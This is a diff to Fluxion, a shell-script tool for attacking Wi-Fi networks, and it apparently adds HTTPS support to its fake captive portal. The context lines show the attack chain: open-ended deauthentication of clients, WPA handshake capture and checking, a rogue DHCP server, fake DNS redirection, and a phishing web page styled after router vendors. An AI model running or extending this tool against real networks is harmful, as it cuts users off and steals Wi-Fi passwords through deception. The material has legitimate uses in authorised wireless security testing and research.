@@ -2,7 +2,7 @@
 
 ########## DEBUG Mode ##########
 ##			      ##
-FLUX_DEBUG=0	
+FLUX_DEBUG=0
 ##			      ##
 ################################
 
@@ -27,7 +27,7 @@ ipNmap=`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*)
 # Deauth duration during handshake capture
 # oo
 DEAUTHTIME="9999999999999"
-revision=96
+revision=97
 version=0.23
 IP=192.168.1.1
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
@@ -921,7 +921,7 @@ function language {
 			7 ) italian; setinterface; break;;
 			8 ) czech; setinterface; break;;
 			9 ) greek; setinterface; break;;
-			skip ) english; skipme; break;; 
+			skip ) english; skipme; break;;
 			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
 		  esac
 	done
@@ -981,7 +981,7 @@ function german {
 	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 	selection_1="Mit aktive Nutzer"
 	selection_2="Wähle dein Angriffsziel. Um neuzuscannen tippe $red r$transparent"
-	
+
 }
 
 function english {
@@ -1089,7 +1089,7 @@ function romanian {
     #
     selection_1="Clienti activi"
     selection_2="Selecteaza tinta. Pentru rescanare tastati$red r$transparent"
-    
+
 }
 
 function turkish {
@@ -1145,7 +1145,7 @@ function turkish {
     #
     selection_1="Aktif kullanicilar"
     selection_2="Tekrar taramak icin Hedef seciniz type$red r$transparent"
-    
+
 }
 
 function spanish {
@@ -1201,7 +1201,7 @@ function spanish {
     #
     selection_1="Clientes activos"
     selection_2="Seleccione objetivo. Para reescanear teclee$red r$transparent"
-	
+
 
 }
 
@@ -1249,7 +1249,7 @@ function chinese {
 	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 	selection_1="活动的客户端"
 	selection_2="选择一个目标. 重扫 按$red r$transparent"
-	
+
 }
 
 function italian {
@@ -1306,7 +1306,7 @@ function italian {
     #
     selection_1="Dispositivi connessi"
     selection_2="Seleziona Obiettivo. Per effettuare una nuova scansione delle reti premi$red r$transparent"
-    
+
 }
 
 function czech {
@@ -1359,7 +1359,7 @@ function czech {
 	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 	selection_1="Aktivní klienti"
 	selection_2="Select target. Pro znovuskenování napište$red r$transparent"
-	
+
 }
 
 function greek {
@@ -1412,7 +1412,7 @@ function greek {
     # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
     selection_1="Ενεργοί πελάτες"
     selection_2="Επιλέξτε στόχο. Για σκανάρισμα ξανά, πατήστε το$red r$transparent"
-    
+
 }
 
 # Choose Interface
@@ -1597,11 +1597,11 @@ function selection {
 		read back
 		if [ $back = 'n' ] && [ $back = 'N' ] && [ $back = 'no' ] && [ $back = 'No' ];then
 			exitmode && break
-				
+
 		elif [ $back = 'y' ] && [ $back = 'Y' ] && [ $back = 'yes' ] && [ $back = 'Yes' ];then
 			setinterface && break
 		fi
-			
+
 	fi
 
 	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
@@ -3559,7 +3559,7 @@ function handshakelocation {
 				if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
 					if aircrack-ng $handshakeloc | grep -q "1 handshake"; then
 						cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
-						webinterface					
+						webinterface
 					else
 					echo -e $yellow "Corrupted handshake" $transparent
 					echo
@@ -3696,7 +3696,7 @@ function deauth {
 			HOST=`cat $DUMP_PATH/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
 			LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`
 
-	
+
 			if [ $LINEAS_CLIENTES -le 5 ]; then
 				DEAUTH=deauthall
 				capture & $DEAUTH
@@ -3707,7 +3707,7 @@ function deauth {
 
 			capture
 			for CLIENT in $HOST; do
-				Client_MAC=`echo ${CLIENT:0:17}`				
+				Client_MAC=`echo ${CLIENT:0:17}`
 				deauthesp
 			done
 			$DEAUTH
@@ -3736,7 +3736,7 @@ function deauthMENU {
 		echo -e "      "$red"["$yellow"2"$red"]"$transparent" $general_back (Select another deauth method)"
 		echo -e "      "$red"["$yellow"3"$red"]"$transparent" Select another network"
 		echo -e "      "$red"["$yellow"4"$red"]"$transparent" Exit"
-		echo -n '      #> '
+		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 		read yn
 
 		case $yn in
@@ -3769,7 +3769,7 @@ function checkhandshake {
 		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
 			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
 			wpaclean $HANDSHAKE_PATH/$Host_SSID2-$Host_MAC.cap $DUMP_PATH/$Host_MAC-01.cap &>$flux_output_device
-			webinterface
+			certssl
 			i=2
 			break
 
@@ -3783,7 +3783,7 @@ function checkhandshake {
 		if pyrit -r $DUMP_PATH/test.cap analyze 2>&1 | grep -q "good,"; then
 			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
 			pyrit -r $DUMP_PATH/test.cap -o $HANDSHAKE_PATH/$Host_SSID2-$Host_MAC.cap strip &>$flux_output_device
-			webinterface
+			certssl
 			i=2
 			break
 
@@ -3822,7 +3822,7 @@ function certssl {
 		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Search for SSl certificate" # hop to certssl check again
 		echo -e "      "$red"["$yellow"3"$red"]"$red" Exit" $transparent
 		echo " "
-		echo -n '      #> '
+		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 		read yn
 
 		case $yn in
@@ -3843,7 +3843,7 @@ function certssl {
 		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Search for SSl certificate" # hop to certssl check again
 		echo -e "      "$red"["$yellow"3"$red"]"$red" Exit" $transparent
 		echo " "
-		echo -n '      #> '
+		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 		read yn
 
 		case $yn in
@@ -4134,7 +4134,7 @@ function ConnectionRESET {
         			DIALOG_WEB_DIR=$DIALOG_WEB_DIR_CZ
         			NEUTRA
         			break
-			
+
 			 elif [ "$fluxass" = "15" ]; then
                                 DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_NO
                                 DIALOG_WEB_INFO=$DIALOG_WEB_INFO_NO
@@ -4148,7 +4148,7 @@ function ConnectionRESET {
                                 DIALOG_WEB_DIR=$DIALOG_WEB_DIR_NO
                                 NEUTRA
                                 break
-			
+
 			 elif [ "$fluxass" = "16" ]; then
                                 DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_BG
                                 DIALOG_WEB_INFO=$DIALOG_WEB_INFO_BG
@@ -4175,7 +4175,7 @@ function ConnectionRESET {
                                 DIALOG_WEB_DIR=$DIALOG_WEB_DIR_SRB
                                 NEUTRA
                                 break
-			
+
 			elif [ "$fluxass" = "18" ]; then
                                 DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_PL
                                 DIALOG_WEB_INFO=$DIALOG_WEB_INFO_PL
@@ -4221,7 +4221,7 @@ function ConnectionRESET {
 				BELKIN
 				break
 
-		
+
 			elif [ "$fluxass" = "22" ]; then
 				NETGEAR
 				break
@@ -4245,7 +4245,7 @@ function ConnectionRESET {
 			elif [ "$fluxass" = "27" ]; then
 				VODAFONE
 				break
-				
+
 			elif [ "$fluxass" = "28" ]; then
 				TPLINK
 				break
@@ -4345,49 +4345,56 @@ range $RANG_IP.100 $RANG_IP.250;
 	touch $DUMP_PATH/dhcpd.leases
 
 	# creates Lighttpd web-server
-	echo "server.document-root = \"$DUMP_PATH/data/\"
+  echo "server.document-root = \"$DUMP_PATH/data/\"
 
-server.modules = (
-  \"mod_access\",
-  \"mod_alias\",
-  \"mod_accesslog\",
-  \"mod_fastcgi\",
-  \"mod_redirect\",
-  \"mod_rewrite\"
-)
+  server.modules = (
+    \"mod_access\",
+    \"mod_alias\",
+    \"mod_accesslog\",
+    \"mod_fastcgi\",
+    \"mod_redirect\",
+    \"mod_rewrite\"
+  )
 
-fastcgi.server = ( \".php\" => ((
-		  \"bin-path\" => \"/usr/bin/php-cgi\",
-		  \"socket\" => \"/php.socket\"
-		)))
+  fastcgi.server = ( \".php\" => ((
+  		  \"bin-path\" => \"/usr/bin/php-cgi\",
+  		  \"socket\" => \"/php.socket\"
+  		)))
 
-server.port = 80
-server.pid-file = \"/var/run/lighttpd.pid\"
-# server.username = \"www\"
-# server.groupname = \"www\"
+  server.port = 80
+  server.pid-file = \"/var/run/lighttpd.pid\"
+  # server.username = \"www\"
+  # server.groupname = \"www\"
 
-mimetype.assign = (
-\".html\" => \"text/html\",
-\".htm\" => \"text/html\",
-\".txt\" => \"text/plain\",
-\".jpg\" => \"image/jpeg\",
-\".png\" => \"image/png\",
-\".css\" => \"text/css\"
-)
-
-server.error-handler-404 = \"/\"
-
-static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
-index-file.names = ( \"index.htm\",\"index.html\",\"index.php\" )
+  mimetype.assign = (
+  \".html\" => \"text/html\",
+  \".htm\" => \"text/html\",
+  \".txt\" => \"text/plain\",
+  \".jpg\" => \"image/jpeg\",
+  \".png\" => \"image/png\",
+  \".css\" => \"text/css\"
+  )
 
 
+  server.error-handler-404 = \"/\"
 
-#Redirect www.domain.com to domain.com
-\$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
-	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
+  static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
+  index-file.names = ( \"index.htm\" )
 
+  \$SERVER[\"socket\"] == \":443\" {
+  	url.redirect = ( \"^/(.*)\" => \"http://www.internet.com\")
+  	ssl.engine                  = \"enable\"
+  	ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
 
-}" > $DUMP_PATH/lighttpd.conf
+  }
+
+  #Redirect www.domain.com to domain.com
+  \$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
+  	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
+  	ssl.engine                  = \"enable\"
+  	ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
+  }
+  " >$DUMP_PATH/lighttpd.conf
 
 # that redirects all DNS requests to the gateway
 	echo "import socket
@@ -4445,15 +4452,17 @@ function routear {
 	route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
 	sysctl -w net.ipv4.ip_forward=1 &>$flux_output_device
 
-	iptables --flush
-	iptables --table nat --flush
-	iptables --delete-chain
-	iptables --table nat --delete-chain
-	iptables -P FORWARD ACCEPT
+  iptables --flush
+  iptables --table nat --flush
+  iptables --delete-chain
+  iptables --table nat --delete-chain
+  iptables -P FORWARD ACCEPT
 
-	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
-	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:80
-	iptables -t nat -A POSTROUTING -j MASQUERADE
+  iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
+  iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:443
+  iptables -A INPUT -p tcp --sport 443 -j ACCEPT
+  iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
+  iptables -t nat -A POSTROUTING -j MASQUERADE
 }
 
 # Attack
@@ -4498,7 +4507,7 @@ function attack {
 
 	xterm -bg black -fg green $TOPLEFT -T DHCP -e "dhcpd -d -f -lf "$DUMP_PATH/dhcpd.leases" -cf "$DUMP_PATH/dhcpd.conf" $interfaceroutear 2>&1 | tee -a $DUMP_PATH/clientes.txt" &
 	xterm $BOTTOMLEFT -bg "#000000" -fg "#99CCFF" -title "FAKEDNS" -e "if type python2 >/dev/null 2>/dev/null; then python2 $DUMP_PATH/fakedns; else python $DUMP_PATH/fakedns; fi" &
-	
+
 	lighttpd -f $DUMP_PATH/lighttpd.conf &> $flux_output_device
 
 	killall aireplay-ng &> $flux_output_device
@@ -4517,7 +4526,7 @@ function attack {
 		echo "      1) Choose another network"
 		echo "      2) Exit"
 		echo " "
-		echo -n '      #> '
+		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 		read yn
 		case $yn in
 			1 ) matartodo; CSVDB=dump-01.csv; selection; break;;
